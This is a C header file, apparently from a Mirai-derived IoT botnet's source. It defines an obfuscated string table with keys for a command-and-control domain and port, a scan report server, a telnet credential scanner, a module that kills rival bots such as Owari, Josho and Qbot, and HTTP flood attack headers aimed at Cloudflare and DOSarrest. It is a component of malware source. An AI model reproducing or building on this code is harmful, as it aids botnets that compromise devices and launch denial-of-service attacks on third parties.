#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

/* cnc */
#define TABLE_CNC_DOMAIN 1
#define TABLE_CNC_PORT 2

/* report */
#define TABLE_SCAN_CB_DOMAIN 3
#define TABLE_SCAN_CB_PORT 4

/* exec message */
#define TABLE_EXEC_SUCCESS 5

/* killer data */
#define TABLE_KILLER_PROC 6
#define TABLE_KILLER_EXE 7
#define TABLE_KILLER_FD 8
#define TABLE_KILLER_MAPS 9
#define TABLE_KILLER_TCP 10

/* sacnner data */
#define TABLE_SCAN_SHELL 11
#define TABLE_SCAN_ENABLE 12
#define TABLE_SCAN_SYSTEM 13
#define TABLE_SCAN_SH 14
#define TABLE_SCAN_QUERY 15
#define TABLE_SCAN_RESP 16
#define TABLE_SCAN_NCORRECT 17
#define TABLE_SCAN_OGIN 18
#define TABLE_SCAN_ASSWORD 19
#define TABLE_SCAN_ENTER 20
#define TABLE_SCAN_PS 21

/* attack data */
#define TABLE_ATK_VSE 22
#define TABLE_ATK_RESOLVER 23
#define TABLE_ATK_NSERV 24

/* ioctl data */
#define TABLE_IOCTL_KEEPALIVE1 25
#define TABLE_IOCTL_KEEPALIVE2 26
#define TABLE_IOCTL_KEEPALIVE3 27
#define TABLE_IOCTL_KEEPALIVE4 28
#define TABLE_IOCTL_KEEPALIVE5 29
#define TABLE_IOCTL_KEEPALIVE6 30
#define TABLE_IOCTL_KEEPALIVE7 31

/* strings/executables data */
#define TABLE_EXEC_MIRAI 32
#define TABLE_EXEC_OWARI 33
#define TABLE_EXEC_JOSHO 34
#define TABLE_EXEC_ALLQBOT 35
#define TABLE_EXEC_OGOWARI 36
#define TABLE_EXEC_MIRAIDLR 37
#define TABLE_EXEC_MIRAIARM 38
#define TABLE_EXEC_MIRAIMIPS 39
#define TABLE_EXEC_MIRAIMPSL 40
#define TABLE_EXEC_X86_64 41
#define TABLE_EXEC_X86 42
#define TABLE_EXEC_ARM7 43
#define TABLE_EXEC_PPC 44

#define TABLE_ATK_KEEP_ALIVE 45
#define TABLE_ATK_ACCEPT 46
#define TABLE_ATK_ACCEPT_LNG 47
#define TABLE_ATK_CONTENT_TYPE 48
#define TABLE_ATK_SET_COOKIE 49
#define TABLE_ATK_REFRESH_HDR 50
#define TABLE_ATK_LOCATION_HDR 51
#define TABLE_ATK_SET_COOKIE_HDR 52
#define TABLE_ATK_CONTENT_LENGTH_HDR 53
#define TABLE_ATK_TRANSFER_ENCODING_HDR 54
#define TABLE_ATK_CHUNKED 55
#define TABLE_ATK_KEEP_ALIVE_HDR 56
#define TABLE_ATK_CONNECTION_HDR 57
#define TABLE_ATK_DOSARREST 58
#define TABLE_ATK_CLOUDFLARE_NGINX 59

/* User agent strings */
#define TABLE_HTTP_ONE 60
#define TABLE_HTTP_TWO 61
#define TABLE_HTTP_THREE 62
#define TABLE_HTTP_FOUR 63
#define TABLE_HTTP_FIVE 64

#define TABLE_MISC_RAND	65

#define TABLE_MAX_KEYS 66

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
